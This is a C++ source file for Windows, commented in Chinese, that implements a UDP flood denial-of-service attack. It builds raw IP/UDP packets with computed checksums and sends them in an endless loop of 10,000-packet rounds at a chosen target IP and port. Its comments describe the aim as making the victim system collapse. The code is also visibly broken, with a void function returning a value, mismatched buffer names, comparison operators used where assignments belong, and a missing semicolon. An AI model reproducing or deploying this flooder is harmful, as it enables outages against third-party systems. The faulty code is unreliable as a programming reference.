// DDOS.cpp: implementation of the CDDOS class.
//
//////////////////////////////////////////////////////////////////////

#include "DDOS.h"
#include <iostream.h>
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CDDOS::CDDOS()		//构造函数
{

}
unsigned short ComputeCheckSum(unsigned short *buffer, int size)
{
	/*
    IP首部校验和的计算主要是两步：按位异或和取反，具体来说
	1. IP头部以16位为一个单位，逐个模2加（相当于异或）；
	2. 得到的结果取反，作为校验和放入校验和字段；
	3. 初始计算校验和字段时该字段全部用0填充；
    以上是对于发送者来说如何计算校验和的，而对于接收者来说，验证也很简单：
	1. 对于接收的IP报文头部以16位为单位逐个求和；
	2. 若结果为1，则校验正确，否则出错丢弃；
    原理很简单，接收方的计算对象是A和A的反的异或，结果当然是1了！

*/
      unsigned long cksum = 0;
      while(size>1)
      {
		  unsigned short num = htons(*buffer++);
		  cksum += num;
          size -= sizeof(USHORT);
      }
        if(size)
        {
			unsigned char temp = (*(UCHAR*)buffer); 
			unsigned short num = temp<<8;
            cksum += num;
        }
        cksum = (cksum>>16) + (cksum&0xffff);
        //return (USHORT)(~cksum);
		//cksum = 0xffff - cksum;
		return htons((USHORT)(~cksum));
}
void CDDOS::fill_udp_buffer(char *szDstIp,unsigned short dPort)
{
/************************************************************************/
/*          填充UDP缓冲区                                                            */
/************************************************************************/
	WSADATA wsaData;
	//初始化socket.dll
	WSAStartup(MAKEWORD(2, 2),&wsaData);
	unsigned int saddr = 0;
	char hostname[MAX_PATH];			//主机名
	gethostname(hostname,MAX_PATH);			//获得主机名
	LPHOSTENT lphost;

	//通过主机名获得主机的详细信息
	lphost = gethostbyname(hostname);
	if (lphost != NULL)
	{

		saddr = ((LPIN_ADDR)lphost->h_addr)->s_addr;


	}
	char pBuffer[BufferSize];		//声明一个1024字节的缓冲区
	IP_HEADER ipHeader;			//IP头
	UDP_HEADER udpHeader;		//UDP头
	int iUdpCheckSumSize;
	char *ptr = NULL;
	FillMemory(pBuffer,BufferSize,'A');		//将pBuffer填充为A
	iTotalSize = sizeof(ipHeader) + sizeof(udpHeader) + BufferSize;		//IP数据报的长度

	//填充IP首部
	//填充IP头
	ipHeader.ver_ihl = (4<<4) | (sizeof(ipHeader)/sizeof(unsigned long));    //版本，IP首部长度
	ipHeader.tos = 0;       //区分服务
	ipHeader.tlen = htons(iTotalSize);   //总长度
	ipHeader.identification = 0;    //标识，任意数值
	ipHeader.flags_of = 0;    // 标志 片偏移
	ipHeader.ttl =128;  //生存时间
	ipHeader.proto = IPPROTO_UDP;  //协议
	ipHeader.saddr = *(IP_ADDRESS *)&saddr;  //源ip地址
	unsigned long ip = inet_addr(szDstIp);
	ipHeader.daddr = *(IP_ADDRESS *)&ip;   //目标Ip地址
	ipHeader.crc = 0;    

	//计算ip校验和
	ipHeader.crc = ComputeCheckSum((unsigned short *)&ipHeader,sizeof(ipHeader));    //首部校验和

	//填充UDP头部
	udpHeader.sport = htons(5444);   //本机端口
	udpHeader.dport = htons(dPort);  //目标端口
	udpHeader.len = htons( sizeof(udpHeader) + BUFFERSIZE);    //标明UDP头部和UDP数据的总长度字节。
	udpHeader.crc = 0;

	//在进行TCP校验和的计算时，需要增加一个TCP伪首部的校验和
	ZeroMemory(g_szSendBuffer,BUFFERSIZE +60);
	ptr  = g_szSendBuffer;

	//源ip地址
	iUdpCheckSumSize = 0;
	memcpy(ptr,&ipHeader.saddr,sizeof(ipHeader.saddr));  
	ptr += sizeof(ipHeader.saddr);
	iUdpCheckSumSize += sizeof(ipHeader.saddr);

	//目的ip地址
	memcpy(ptr,&ipHeader.daddr,sizeof(ipHeader.daddr));  
	ptr += sizeof(ipHeader.daddr);
	iUdpCheckSumSize += sizeof(ipHeader.daddr);

	//一个字节空字符
	ptr++;
	iUdpCheckSumSize++;

	//协议
	memcpy(ptr,&ipHeader.proto,sizeof(ipHeader.proto));  
	ptr += sizeof(ipHeader.proto);
	iUdpCheckSumSize += sizeof(ipHeader.proto);

	//udp长度
	memcpy(ptr,&udpHeader.len,sizeof(udpHeader.len));  
	ptr += sizeof(udpHeader.len);
	iUdpCheckSumSize += sizeof(udpHeader.len);

	//udp数据区
	memcpy(ptr,szBuffer,BUFFERSIZE);
	iUdpCheckSumSize += BUFFERSIZE;

	//计算校验和
	udpHeader.crc = ComputeCheckSum((unsigned short*)g_szSendBuffer,iUdpCheckSumSize);

	//填充发送缓冲区
	memcpy(g_szSendBuffer,&ipHeader,sizeof(ipHeader));
	memcpy(g_szSendBuffer+sizeof(ipHeader),&udpHeader,sizeof(udpHeader));
	memcpy(g_szSendBuffer+sizeof(ipHeader)+sizeof(udpHeader),&szBuffer,BUFFERSIZE);
	return  true;
}
void CDDOS::udp_flood()
{
/************************************************************************/
/* UDP洪水攻击															*/

//攻击原理：当受害者系统接收到一个UDP数据包的时候，他会确定目的的端口正在等待中的应用程序，当他发现端口中并不存在
//          正在等待的应用程序时，他就会产生一个目的地址无法连接的ICMP数据包发送给该伪造的源地址。如果向受害者计
//          算机发送足够多的UDP数据包，整个系统就会瘫痪
/************************************************************************/

	//暂停当前进程，延时两秒
	Sleep(2000);
	WSADATA wsaData;

	WSAStartup(MAKEWORD(2, 2),&wsaData);
	
	SOCKET SendSocket;
	BOOL Flag;
	//创建一个与指定传送服务捆绑的套接字，调用失败则返回
	SendSocket = WSASocket(AF_INET,SOCK_RAW,IPPROTO_UDP,NULL,0,0);
	if ( SendSocket == INVALID_SOCKET )
	{


		return;


	}
	Flag = true;
	//设置套接字选项值
	if (setsockopt(SendSocket,IPPROTO_UDP,IP_HDRINCL,(CHAR *)&Flag,sizeof(Flag))  == SOCKET_ERROR )
	{


		//设置套接字选项值有错误发生
		cout<<"setsockopt Error!\n"<<endl;
		return;

	}
	SOCKADDR_IN addr_in;
	addr_in.sin_family = AF_INET;
	addr_in.sin_port = htons(tgtPort);		//将主机的无符号短整型数转换成网络字节顺序的端口
	addr_in.sin_addr.S_un.s_addr = inet_addr(tgtIP);		//IP地址
	if (addr_in.sin_addr.s_addr == INADDR_NONE)
	{
		//如果IP地址为广播地址
		struct hostent *hp ==NULL;
		//获得目的主机信息
		if ((hp == gethostbyname(tgtIP)) != NULL )
		{

			memcpy(&(addr_in.sin_addr),hp->h_addr,hp->h_length);
			addr_in.sin_family = hp->h_addrtype;

		}
		else{
			return
		}
	}
	for (;;)
	{
		//死循环,实现攻击
		if (StopFlag == 1)
		{
			ExitThread(0);
			return;
		}
		for (int i = 0;i<10000;i++)
		{
			sendto(SendSocket,pSendBuffer,iTotalSize,0,(SOCKADDR*)&addr_in,sizeof(addr_in));
		}
		Sleep(SleepTime);			//每攻击完一轮，暂停一会

	}
	//关闭Socket网络连接
	closesocket(SendSocket);
	return;

}


CDDOS::~CDDOS()		//析构函数
{

}
